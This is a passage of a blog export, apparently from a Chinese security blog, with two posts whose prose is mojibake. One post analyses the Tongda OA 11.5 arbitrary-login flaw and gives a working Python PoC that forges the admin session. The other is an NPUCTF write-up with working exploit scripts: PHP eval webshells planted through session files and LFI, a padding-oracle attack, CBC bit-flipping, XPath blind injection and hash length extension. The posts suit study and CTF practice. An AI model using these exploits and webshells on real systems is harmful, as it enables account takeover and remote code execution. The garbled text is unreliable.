11.5ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´åˆ†æ","slug":"é€šè¾¾OA-11-5ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´åˆ†æ","date":"2020-04-22T09:43:04.000Z","updated":"2020-04-28T12:28:14.056Z","comments":true,"path":"2020/04/22/é€šè¾¾OA-11-5ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´åˆ†æ/","link":"","permalink":"https://glotozz.github.io/2020/04/22/%E9%80%9A%E8%BE%BEOA-11-5%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ç¯å¢ƒæ­å»º æ¼æ´åˆ†æ æ¼æ´å¤ç° å‚è€ƒé“¾æ¥ ç¯å¢ƒæ­å»ºä¸‹è½½é€šè¾¾OA11.5 http://www.tongda2000.com/download/2019.php?F=&amp;K= å®˜ç½‘æ²¡æœ‰æä¾›V11.4ï¼Œå¯ä»¥ä»11.3çš„æœåŠ¡å™¨ç®¡ç†æ›´æ–°å¾—åˆ°ã€‚ diffä¸åŒï¼Œæœ€ç»ˆæ‰¾åˆ°ä»»æ„ç”¨æˆ·ç™»å½•æ¼æ´è§¦å‘ç‚¹ æ¼æ´åˆ†ælogincheck_code.php intval()é˜²æ­¢sqlæ³¨å…¥ï¼Œä½†æ˜¯è¿™é‡Œç”¨æˆ·å¯ä»¥ä¼ªé€ ä»»æ„UIDï¼Œé»˜è®¤adminç”¨æˆ·çš„UIDä¸º1 éœ€è¦ç»•è¿‡15è¡Œçš„åˆ¤æ–­ï¼Œåªè¦æŸ¥è¯¢å¾—åˆ°çš„$login_codeuidä¸ä¸ºç©ºå³å¯ã€‚ è·Ÿè¿›get_cache() æ ¹æ®ä¼ å…¥çš„idè¿›è¡ŒæŸ¥è¯¢ é‚£ä¹ˆå…¨å±€æœç´¢è°ƒç”¨set_cache()ï¼Œå¹¶ä¸”è®¾ç½®CODE_LOGINçš„åœ°æ–¹ï¼Œåªæœ‰ä¸€å¤„ general/login_code.php é‚£ä¹ˆå¯ä»¥é€šè¿‡è¿™ä¸ªé¡µé¢è¯»å–code_uidï¼Œå†å»ä¹‹å‰çš„é¡µé¢ä¼ªé€ èº«ä»½ã€‚ æ¼æ´å¤ç°1ã€ 2ã€ 3ã€ poc 123456789101112131415161718192021# coding=utf-8import requestsimport reurl = \"http://127.0.0.1:8088\"url1 = url + \"/general/login_code.php\"url2 = url + \"/logincheck_code.php\"url3 = url + \"/general/index.php\"r = requests.get(url1).contenttmp = re.search(r'code_uid\":\"(.*?)\"&#125;', r.decode(\"ISO-8859-1\")) # utf-8' codec can't decode byte# print(tmp.group(1))codeuid = tmp.group(1)r = requests.post(url2, data=&#123;'UID': 1, 'CODEUID': codeuid&#125;).headerscookie = r['Set-Cookie'][:-7]# print(tmp)headers = &#123; 'Cookie': cookie&#125;r = requests.get(url3, headers=headers).contentif \"admin\" in r.decode(\"ISO-8859-1\"): print(\"ok\") å‚è€ƒé“¾æ¥ https://mp.weixin.qq.com/s/yJuLhC1GxkMbGL0mRORIoA","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"NPUCTF-wp","slug":"NPUCTF-wp","date":"2020-04-20T10:25:55.000Z","updated":"2020-04-27T12:25:28.609Z","comments":true,"path":"2020/04/20/NPUCTF-wp/","link":"","permalink":"https://glotozz.github.io/2020/04/20/NPUCTF-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• è¶…ç®€å•çš„PHPï¼ï¼ï¼è¶…ç®€å•ï¼ï¼ï¼ webğŸ• RealEzPHP ezlogin ezinclude éªŒè¯ğŸ ezShiro è¶…ç®€å•çš„PHPï¼ï¼ï¼è¶…ç®€å•ï¼ï¼ï¼æ–‡ä»¶åŒ…å«è¯»æºç ï¼Œä¸»è¦æ˜¯ä¸‹é¢ä¸¤ä¸ª /phpinfo.php /msg.php 12345678910111213141516171819202122232425&lt;?php header('content-type:application/json');session_start();function safe($msg)&#123; if (strlen($msg)&gt;17)&#123; return \"msg is too loooong!\"; &#125; else &#123; return preg_replace(\"/php/\",\"?\",$msg); &#125;&#125;if (!isset($_SESSION['msg'])&amp;empty($_SESSION['msg']))$_SESSION['msg'] = array();if (isset($_POST['msg']))&#123; array_push($_SESSION['msg'], ['msg'=&gt;safe($_POST['msg']),'time'=&gt;date('Y-m-d H:i:s',time())]); echo json_encode(array(['msg'=&gt;safe($_POST['msg']),'time'=&gt;date('Y-m-d H:i:s',time())])); exit();&#125;if(!empty($_SESSION['msg']))&#123; echo json_encode($_SESSION['msg']);&#125; else &#123;echo \"Ã¨Â¿Â˜Ã¤Â¸ÂÃ¥Â¿Â«Ã¥ÂÂ»Ã§Â•Â™Ã¨Â¨Â€Ã¯Â¼Â\";&#125;?&gt; å°†ç”¨æˆ·ä¼ å…¥çš„msgå†™å…¥sessionæ–‡ä»¶ï¼Œç»™äº†phpinfo()å¯çŸ¥sessionè·¯å¾„ï¼Œé…åˆæ–‡ä»¶åŒ…å«getshellã€‚ è€ƒç‚¹æ˜¯é™åˆ¶äº†å•æ¬¡å†™å…¥çš„msgè¦17å­—ç¬¦ä»¥å†…ï¼Œçœ‹æ¯”èµ›æ–‡æ¡£çš„æ—¶å€™çœ‹åˆ°äº†æ€è·¯å“ˆå“ˆå“ˆ 1ã€åˆ©ç”¨åå¼•å·ï¼Œä½†æ˜¯è¿™é‡Œdisable_funcä¸­ç¦ç”¨äº†shell_exec()ï¼Œæ— æ³•ä½¿ç”¨ã€‚ 2ã€åˆ©ç”¨çŸ­æ ‡ç­¾ï¼Œè¿™é‡Œä¹Ÿå…³é—­äº†ã€‚ 3ã€å› ä¸ºä¸€æ¬¡å†™å…¥æ— æ³•æ„é€ ï¼Œå¯ä»¥åˆ©ç”¨æ³¨é‡Šç¬¦å¤šæ¬¡å†™å…¥ 1234&lt;?PHP &#x2F;**&#x2F;eval&#x2F;**&#x2F;($_GET[a]);#?&gt; ç›´è§‚ä¸€ç‚¹ 1msg|a:4:&#123;i:0;a:2:&#123;s:3:&quot;msg&quot;;s:9:&quot;&lt;?PHP &#x2F;*&quot;;s:4:&quot;time&quot;;s:19:&quot;2020-04-20 19:34:56&quot;;&#125;i:1;a:2:&#123;s:3:&quot;msg&quot;;s:8:&quot;*&#x2F;eval&#x2F;*&quot;;s:4:&quot;time&quot;;s:19:&quot;2020-04-20 19:34:58&quot;;&#125;i:2;a:2:&#123;s:3:&quot;msg&quot;;s:14:&quot;*&#x2F;($_GET[a]);#&quot;;s:4:&quot;time&quot;;s:19:&quot;2020-04-20 19:35:09&quot;;&#125;i:3;a:2:&#123;s:3:&quot;msg&quot;;s:2:&quot;?&gt;&quot;;s:4:&quot;time&quot;;s:19:&quot;2020-04-20 19:35:17&quot;;&#125;&#125; æœ€åbypasså¯ä»¥åˆ©ç”¨error_log()è§¦å‘ld_preload webğŸ•æºç  123456789101112131415161718192021222324252627282930313233343536&lt;?php error_reporting(0);include('config.php'); # $key,$flagdefine(\"METHOD\", \"aes-128-cbc\"); //å®šä¹‰åŠ å¯†æ–¹å¼define(\"SECRET_KEY\", $key); //å®šä¹‰å¯†é’¥define(\"IV\",\"6666666666666666\"); //å®šä¹‰åˆå§‹å‘é‡ 16ä¸ª6define(\"BR\",'&lt;br&gt;');if(!isset($_GET['source']))header('location:./index.php?source=1');#var_dump($GLOBALS); //å¬è¯´ä½ æƒ³çœ‹è¿™ä¸ªï¼Ÿfunction aes_encrypt($iv,$data)&#123; echo \"--------encrypt---------\".BR; echo 'IV:'.$iv.BR; return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;&#125;function aes_decrypt($iv,$data)&#123; return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die('False');&#125;if($_GET['method']=='encrypt')&#123; $iv = IV; $data = $flag; echo aes_encrypt($iv,$data);&#125; else if($_GET['method']==\"decrypt\")&#123; $iv = @$_POST['iv']; $data = @$_POST['data']; echo aes_decrypt($iv,$data);&#125;echo \"æˆ‘æ‘Šç‰Œäº†ï¼Œå°±æ˜¯æ‡’å¾—å†™å‰ç«¯\".BR;if($_GET['source']==1)highlight_file(__FILE__);?&gt; ä¼ method=encryptå¯ä»¥å¾—åˆ°IVå’Œ$flagåŠ å¯†åçš„å¯†æ–‡ï¼Œ ä¼ method=decryptå¯ä»¥å¯¹ä¼ å…¥çš„IVå’Œdataè¿›è¡Œè§£å¯† 12345å”¯å¯†æ–‡æ”»å‡»ï¼šåªçŸ¥é“å¯†æ–‡å·²çŸ¥æ˜æ–‡æ”»å‡»ï¼šå¾—åˆ°äº†ä¸€äº›ç‰¹å®šçš„æ˜æ–‡ä¸å¯¹åº”çš„å¯†æ–‡é€‰æ‹©æ˜æ–‡æ”»å‡»ï¼šæ”»å‡»è€…å¯ä»¥ä»»æ„é€‰æ‹©ä¸€äº›æ˜æ–‡ï¼Œå¹¶å¾—åˆ°å¯¹åº”çš„å¯†æ–‡é€‰æ‹©å¯†æ–‡æ”»å‡»ï¼šæ”»å‡»è€…å¯ä»¥ä»»æ„çš„åˆ¶é€ æˆ–è€…é€‰æ‹©ä¸€äº›å¯†æ–‡ï¼Œå¹¶å¾—åˆ°å¯¹åº”çš„æ˜æ–‡é€‰æ‹©æ–‡æœ¬æ”»å‡»ï¼šæ”»å‡»è€…å¯ä»¥åˆ¶é€ ä»»æ„çš„æ˜æ–‡&#x2F;å¯†æ–‡ï¼Œå¹¶å¾—åˆ°å¯¹åº”çš„å¯†æ–‡&#x2F;æ˜æ–‡ï¼Œä¹Ÿå°±æ˜¯é€‰æ‹©æ˜æ–‡æ”»å‡»+é€‰æ‹©å¯†æ–‡æ”»å‡» è¿™é¢˜ç¬¦åˆCBCé€‰æ‹©å¯†æ–‡æ”»å‡»ï¼Œä½†æ˜¯ä¸€èˆ¬ç”¨æ¥å¾—åˆ°IVçš„ï¼Œä½†æ˜¯è¿™é‡Œç»™äº†IV å¹¶ä¸”ç†è®ºä¸Šå¯ä»¥ç›´æ¥å°†ç»™æˆ‘ä»¬çš„å¯†æ–‡è§£å¯†ï¼Œè¿”å›äº†ä¸€ä¸ª1ï¼Œæ˜¯å› ä¸ºå¢åŠ äº†openssl_decrypt() or die(&#39;False&#39;)ï¼Œå¯¼è‡´æ­£å¸¸è§£å¯†ä¼šè¿”å›1ï¼Œæœ‰æƒ³ç€æœ¬åœ°æµ‹è¯•æŠŠè¿™ä¸ªåˆ é™¤ï¼Œä½†æ˜¯ç”±äºkeyæœªçŸ¥ï¼Œæ— æ³•æˆåŠŸè§£å¯† æ²¡å•¥åˆ«çš„æƒ³æ³•ï¼Œæœopenssl_decrypt()çš„bugä¹Ÿæ²¡æ”¶è·ï¼Œé‚ä½œç½¢ ==========================é‡æ–°çœ‹ä¸€ä¸‹ CBCæ¨¡å¼çš„åŠ å¯†æ–¹å¼æ˜¯é€šè¿‡ä¸€ä¸ªåˆå§‹å‘é‡ï¼ˆIVï¼‰å…ˆå’Œæ˜æ–‡åˆ†ç»„ç¬¬ä¸€ç»„å¼‚æˆ–åä½¿ç”¨ç§˜é’¥KåŠ å¯†ï¼Œä½œä¸ºç¬¬ä¸€ç»„å¯†æ–‡ï¼ŒåŒæ—¶åˆä¸åä¸€åˆ†ç»„çš„æ˜æ–‡å¼‚æˆ–åè¿›è¡ŒåŠ å¯†äº§ç”Ÿä¸‹ä¸€ç»„å¯†æ–‡ï¼Œä¾æ¬¡é‡å¤ã€‚å…¶è§£å¯†å’ŒåŠ å¯†æ˜¯å¯¹ç§°çš„ï¼Œå¯†æ–‡å…ˆè§£å¯†ï¼Œå†å¼‚æˆ–ã€‚ Padding Oracle Attack https://www.cnblogs.com/p00mj/p/11797786.html æ¡ä»¶ï¼šå·²çŸ¥IVå’Œå¯†æ–‡ï¼Œå¯ä»¥åˆ©ç”¨æœåŠ¡ç«¯è§£å¯† ç»“æœï¼šè·å–å¯†æ–‡å¯¹åº”çš„æ˜æ–‡(å¦‚æœåˆ†ç»„å¤§äº1ç»„ï¼Œæ²¡æœ‰IVçš„æƒ…å†µè¿™é‡Œå¯ä»¥è·å–åˆ°éƒ¨åˆ†æ˜æ–‡) å’Œé¢˜ç›®ç»™çš„æ¡ä»¶å®Œå…¨ç¬¦åˆã€‚ åˆ†ç»„åŠ å¯†ä¸­æ•°æ®å¡«å……å¸¸ç”¨çš„æ–¹å¼ï¼ˆPKCS#5ï¼‰ æ ¸å¿ƒæ€æƒ³ï¼ˆæ¯”å¦‚æ±‚æœ€åä¸€ä½ï¼‰ ç©·ä¸¾IVï¼Œå½“æ­£å¸¸è§£å¯†æ—¶ï¼ˆ0x3Cï¼‰å³å¯åˆ©ç”¨æ˜æ–‡0x01 xor 0x3Cå¾—åˆ°ä¸­é—´å€¼ä¸º0X3Dï¼Œè€ŒåŸå§‹IVä¸º0X39ï¼Œ æ˜æ–‡ = ä¸­é—´å€¼ xor IVï¼Œ 12340x01 &#x3D; ä¸­é—´å€¼ xor 0x3cå¾…æ±‚æ˜æ–‡ &#x3D; ä¸­é—´å€¼ xor 0x39&#x3D;&gt;å¾…æ±‚æ˜æ–‡ &#x3D; 0x01 xor 0x3c xor 0x39 exp 1234567891011121314151617181920212223242526272829303132import requestsimport base64url = 'http://ha1cyon-ctf.fun:30141/index.php?source&amp;method=decrypt'N = 16l = [0] * Niv = '6666666666666666'tmp_iv = ''out = [0] * Ns = ''for i in range(1, N+1): for c in range(0,256): l[N-i] = c tmp_iv = '' for m in l: tmp_iv += chr(m) print base64.b64encode(tmp_iv) # print payload data = &#123; 'iv': tmp_iv, 'data': 'ly7auKVQCZWum/W/4osuPA==', &#125; data = requests.post(url, data=data).content.decode('utf-8') if 'False' not in data: out[N-i] = c ^ i for y in range(i): l[N-y-1] = out[N-y-1] ^ (i+1) breakfor i in range(N): out[i] = out[i] ^ ord(iv[i])for c in out: s += chr(c)print s ç¬¬äºŒå…³æºç  1234567891011121314151617181920212223242526272829303132 &lt;?php #error_reporting(0);include('config.php'); //$fl4gdefine(\"METHOD\", \"aes-128-cbc\");define(\"SECRET_KEY\", \"6666666\");session_start();function get_iv()&#123; //ç”Ÿæˆéšæœºåˆå§‹å‘é‡IV $random_iv=''; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;$lalala = 'piapiapiapia';if(!isset($_SESSION['Identity']))&#123; $_SESSION['iv'] = get_iv(); $_SESSION['Identity'] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION['iv']));&#125;echo base64_encode($_SESSION['iv']).\"&lt;br&gt;\";if(isset($_POST['iv']))&#123; $tmp_id = openssl_decrypt(base64_decode($_SESSION['Identity']), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST['iv'])); echo $tmp_id.\"&lt;br&gt;\"; if($tmp_id ==='weber')die($fl4g);&#125;highlight_file(__FILE__);?&gt; cbcå­—èŠ‚ç¿»è½¬æ”»å‡» ä»¥å‰æ¥è§¦çš„ä¸€èˆ¬æ˜¯å·²çŸ¥IVï¼Œä¸€ç»„æ˜æ–‡å’Œå¯†æ–‡ï¼Œä¼ªé€ å¯†æ–‡å¾—åˆ°æƒ³è¦çš„æ˜æ–‡ã€‚ ä½†æ˜¯ç”±äºè¿™é‡ŒåŠ å¯†çš„æ˜æ–‡è¾ƒçŸ­ï¼ˆ16ä½ä»¥å†…ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥ä¼ªé€ IVï¼Œä¹Ÿå¯ä»¥è¿›è¡ŒCBCå­—èŠ‚ç¿»è½¬ exp 12345678910# coding=utf-8import base64 as b64source_str = 'piapiapiapia' + 4 * '\\x04'target_srt = 'weber' + 11 * '\\x0b'token = 'sS8OuVOl9tyCkzAzsabGBA==' # ä½ è·å¾—çš„åˆå§‹IVçš„base64encodeå€¼token = list(b64.b64decode(token))for x in range(0, len(target_srt)): token[x] = chr(ord(token[x]) ^ ord(target_srt[x]) ^ ord(source_str[x]))print b64.b64encode(''.join(token)) åˆšæƒ³æ‰“å¥½åƒç¯å¢ƒæ²¡äº†ã€‚ã€‚ ===========================ç¬¬äºŒå¤©buuä¸Šçš„ç¯å¢ƒå°±æ­å¥½äº†å“ˆå“ˆ å¾—åˆ°ç½‘ç›˜åœ°å€ä¸‹è½½å¾—åˆ°HelloWorld.classï¼Œjd-guiåç¼–è¯‘å¾—åˆ°flag RealEzPHPæºç  1234567891011121314151617181920212223242526&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = \"Y-m-d h:i:s\"; $this-&gt;b = \"date\"; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp;if(isset($_GET['source']))&#123; highlight_file(__FILE__); die(0);&#125;@$ppp = unserialize($_GET[\"data\"]);2020-04-20 12:59:59 åˆ©ç”¨assert()å‘½ä»¤æ‰§è¡Œï¼Œ 12345phpinfo()&#x3D;&gt;PHP Version 7.0.33disable_functionpcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,readdir ä¸‹ä¸€æ­¥ 12345678var_dump(scandir(&#39;&#x2F;&#39;))&#x3D;&gt;string(10) &quot;FIag_!S_it&quot;ç¦ç”¨äº†readfile,å°è¯•file_get_contents()var_dump(base64_encode(file_get_contents(\\&#39;&#x2F;FIag_!S_it\\&#39;)))&#x3D;&gt;string(64) &quot;TlBVQ1RGe3RoaXNfaXNfbm90X2FfZmFrZV9mbGFnX2J1dF90cnVlX2ZsYWd9Cg&#x3D;&#x3D;&quot; å¯æƒœflagæ˜¯é”™çš„ï¼Œæƒ³åŠæ³•è¿èšå‰‘ï¼Œé€šè¿‡ä¸‹é¢çš„æ–¹å¼å†™å…¥ä¸€å¥è¯ 1file_put_contents(&#39;1.php&#39;, base64_decode(&#39;PD9waHAgZXZhbCgkX1BPU1RbMV0pOw&#x3D;&#x3D;&#39;)) ä¸€å¼€å§‹è‡ªå·±çš„æµ‹è¯•ç¯å¢ƒæ˜¯php7.1.9ï¼Œä½†æ˜¯å‘ç°åœ¨php7.1.9ä¸­æ— æ³•æ­£å¸¸å†™å…¥ï¼Œæç¤ºCannot call assert() with string argument dynamicallyï¼Œåˆ‡æ¢æˆphp7.0.9æˆåŠŸå†™å…¥ã€‚ç½‘ä¸Šè§£é‡Šçš„ä¹Ÿä¸æ¸…æ¥šï¼Œæœ€å¥½çš„åŠæ³•è¿˜æ˜¯åˆ‡æˆå’Œé¢˜ç›®ç›¸åŒçš„ç¯å¢ƒ æœ€åå¯ä»¥é€šè¿‡error_log()bypassï¼Œéé¢„æœŸè§£æ˜¯phpinfo()ä¸­çš„ç¯å¢ƒå˜é‡ ezloginhintï¼šè¯·è‡ªè¡Œäº†è§£XPathç›²æ³¨ï¼Œè·¯å¾„è¡¨è¾¾å¼å¯ç”¨äºé€‰å–XMLæ–‡æ¡£ä¸­çš„èŠ‚ç‚¹æˆ–è€…èŠ‚ç‚¹é›† xpathæ³¨å…¥è¯¦è§£ xpathæ³¨å…¥æŒ‡åŒ— demo 123456789101112&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;a&gt; &lt;b&gt; &lt;id&gt;2&lt;/id&gt; &lt;age&gt;3&lt;/age&gt; &lt;/b&gt; &lt;b&gt; &lt;id&gt;3&lt;/id&gt; &lt;age&gt;5&lt;/age&gt; &lt;/b&gt; &lt;secret&gt;flag&#123;xxx&#125;&lt;/secret&gt;&lt;/a&gt; æŸ¥è¯¢è¯­å¥ 1&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;2&#39; and age&#x2F;text()&#x3D;&#39;3&#39;] å¸¸è§„æ³¨å…¥ ä¸‡èƒ½å¯†ç 1ï¼ˆå·²çŸ¥ä¸€ä¸ªèŠ‚ç‚¹ï¼‰ 1&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;2&#39; or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;] ä¸‡èƒ½å¯†ç 2ï¼ˆæ— éœ€çŸ¥é“èŠ‚ç‚¹ï¼‰ 1&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;2&#39; or 1 or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;] èŠ‚ç‚¹éå† |è¡¨ç¤ºè®¡ç®—ä¸¤ä¸ªèŠ‚ç‚¹é›†ï¼Œ//*è¡¨ç¤ºé€‰å–æ–‡æ¡£ä¸­æ‰€æœ‰å…ƒç´  1&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;2&#39;] | &#x2F;&#x2F;* | &#x2F;&#x2F;*[&#39;&#39; and age&#x2F;text()&#x3D;&#39;3&#39;] å¸ƒå°”ç›²æ³¨ ä¹‹å‰çš„èŠ‚ç‚¹éå†è™½ç„¶é€‰å–åˆ°äº†æ‰€æœ‰æ•°æ®ï¼Œä½†æ˜¯é€šå¸¸ä¸ä¼šæ‰“å°å‡ºæ¥ï¼Œæ‰“å°ä¸€éƒ¨åˆ†æˆ–è€…åªæ˜¯ç”¨æ¥åšä¸ªåˆ¤æ–­ã€‚ åˆ¤æ–­æ ¹èŠ‚ç‚¹æ•°é‡ /è¡¨ç¤ºä»æ ¹èŠ‚ç‚¹é€‰å– 1&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;&#39;or count(&#x2F;)&#x3D;1 or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;] æ­£å¸¸å›æ˜¾è¯´æ˜åªæœ‰ä¸€ä¸ªæ ¹èŠ‚ç‚¹ è·å–æ ¹èŠ‚ç‚¹é•¿åº¦ /*[1]è¡¨ç¤ºå…ˆé€‰å–æ‰€æœ‰æ ¹èŠ‚ç‚¹ï¼Œå†å–ç¬¬ä¸€ä¸ªå…ƒç´  1&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;&#39; or string-length(name(&#x2F;*[1]))&#x3D;1 or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;] æ­£å¸¸å›æ˜¾è¯´æ˜æ ¹èŠ‚ç‚¹é•¿åº¦ä¸º1 è·å–æ ¹èŠ‚ç‚¹ 1&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;&#39; or substring(name(&#x2F;*[1]), 1, 1)&#x3D;&#39;a&#39; or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;] æ­£å¸¸å›æ˜¾è¯´æ˜æ ¹èŠ‚ç‚¹ç¬¬ä¸€ä½ä¸ºa è·å–æ–‡æœ¬ 1&#x2F;a&#x2F;b[id&#x2F;text()&#x3D;&#39;&#39; or substring(&#x2F;a&#x2F;b&#x2F;id&#x2F;text(), 1, 1)&#x3D;&#39;a&#39; or &#39;1&#39; and age&#x2F;text()&#x3D;&#39;3&#39;] è§£é¢˜æ€è·¯ å…ˆä¸‡èƒ½å¯†ç æµ‹è¯•ï¼Œ 12342&#39; or &#39;1&#x3D;&gt;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯2&#39; or 1 or &#39;1&#x3D;&gt;éæ³•æ“ä½œ è¯´æ˜éæ³•æ“ä½œæ˜¯æ¡ä»¶ä¸ºçœŸçš„æƒ…å†µä¸‹ï¼Œå†™ä¸ªè„šæœ¬ exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# coding=utf-8import requestsdef req(username): import re url = 'http://ha1cyon-ctf.fun:30100/' s = requests.session() r = s.get(url).content # print r.decode('utf-8') re = re.search(r'value=\"(.*?)\" /&gt;', r.decode('utf-8')) token = re.group(0)[7:-4] # print token headers = &#123; 'Content-Type': 'application/xml', &#125; password = '' data = '&lt;username&gt;'+username+'&lt;/username&gt;' \\ '&lt;password&gt;'+password+'&lt;/password&gt;' \\ '&lt;token&gt;'+token+'&lt;/token&gt;' r = s.post(url, headers=headers, data=data).content # print r.content.decode('utf-8') if 'éæ³•æ“ä½œ' in r.decode('utf-8'): print(\"ok\") return 1 else: return 0def test(): req(\"2' or '1\") req(\"2' or 1 or '1\")def getlen(): len = 0 for i in range(1, 40): # username = \"' or string-length(name(/*[1]))=&#123;&#125; or '1\".format(i) # username = \"' or string-length(name(/root/*[1]))=&#123;&#125; or '1\".format(i) # username = \"' or string-length(name(/root/accounts/user/*[3]))=&#123;&#125; or '1\".format(i) username = \"' or string-length(/root/accounts/user[2]/password/text())=&#123;&#125; or '1\".format(i) print(username) res = req(username) if res == 1: return ilen = getlen()flag = \"\"for i in range(len): for j in range(40, 127): # username = \"'or substring(name(/*[1]), &#123;&#125;, 1)='&#123;&#125;' or'1\".format(i + 1, chr(j)) # username = \"'or substring(name(/root*[1]), &#123;&#125;, 1)='&#123;&#125;' or'1\".format(i + 1, chr(j)) # username = \"'or substring(name(/root/accounts/user/*[3]), &#123;&#125;, 1)='&#123;&#125;' or'1\".format(i + 1, chr(j)) # id,username,password username = \"'or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)='&#123;&#125;' or'1\".format(i + 1, chr(j)) # guest,adm1n # cf7414b5bdb2e65ee43083f4ddbc4d9f=&gt;gtfly123 print(username) res = req(username) if res == 1: flag += chr(j) print(flag) break ç™»å½•åå°ï¼Œå‘ç°æ–‡ä»¶åŒ…å«ï¼Œæç¤º/flag å‘ç°é»‘åå•ï¼Œä½¿ç”¨å¤§å°å†™æˆåŠŸç»•è¿‡ 1Php:&#x2F;&#x2F;filter&#x2F;Read&#x3D;convert.Base64-encode&#x2F;resource&#x3D;&#x2F;flag ezincludeæç¤ºmd5($secret.$name)===$pass æ‰«ç›®å½•ï¼Œdir.phpæ˜¾ç¤ºäº†æŸä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå’Œconfig.php =======================å½“æ—¶æ²¡æœ‰å•¥æ€è·¯ å‚è€ƒé“¾æ¥ md5($secret.$name)===$passè¯´æ˜æ˜¯hashé•¿åº¦æ‰©å±•æ”»å‡»ï¼Œ åˆ©ç”¨æ¡ä»¶ï¼š 1ã€secretçš„é•¿åº¦ 2ã€dataçš„å€¼ 3ã€secret+dataçš„å€¼ å…¶ä¸­secretçš„é•¿åº¦å¯çˆ†ç ´ï¼Œå†™ä¸ªè„šæœ¬ ä¸€ä¸ªç»å…¸çš„ä¾‹å­ 1$COOKIE[&quot;getmein&quot;] &#x3D;&#x3D;&#x3D; md5($secret . urldecode($username . $password)) 1hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a gqy å°†å¾—åˆ°çš„ç»“æœç¬¬ä¸€è¡Œä½œä¸ºgetmeinï¼Œç¬¬äºŒè¡Œä½œä¸ºpassword poc 12345678910111213import requestsimport hashpumpyimport urlliburl='http://272358ee-95e8-4d61-99de-cd271030ad7a.node3.buuoj.cn?'for i in range(40): # ä¼ adminå¾—åˆ°hash a, b = hashpumpy.hashpump('973225ae4fc8977f86d1a330b0774630','admin','1',i) print(a, b) req = requests.get(url+\"name=&#123;&#125;&amp;pass=&#123;&#125;\".format(urllib.quote(b),a)) if 'username/password error' not in req.text: print(req.text,url+\"name=&#123;&#125;&amp;pass=&#123;&#125;\".format(urllib.quote(b),a)) å¾—åˆ°ä¸‹ä¸€å…³åœ°å€flflflflag.php 1include($_GET[\"file\"]) å› ä¸ºå‰é¢ç›®å½•æ‰«åˆ°dir.phpï¼Œå¯ä»¥è”æƒ³åˆ°LFI2RCEä¸­çš„php7+LFI+segment fault ä»¥å‰æ•´ç†çš„è„šæœ¬ 12345678910111213141516171819import requestsfrom io import BytesIOimport refiles = &#123; 'file': BytesIO('&lt;?php eval($_REQUEST[sky]);')&#125;url = 'http://272358ee-95e8-4d61-99de-cd271030ad7a.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd'try: r = requests.post(url=url, files=files, allow_redirects=False)except: url = 'http://272358ee-95e8-4d61-99de-cd271030ad7a.node3.buuoj.cn/dir.php' r = requests.get(url) data = re.search(r\"php[a-zA-Z0-9]&#123;1,&#125;\", r.content).group(0) url = \"http://272358ee-95e8-4d61-99de-cd271030ad7a.node3.buuoj.cn/flflflflag.php?file=/tmp/\"+data data = &#123; 'sky':\"phpinfo();\" &#125; r = requests.post(url=url,data=data) print r.content è¿˜éœ€è¦ç»•ä¸‹disable_func 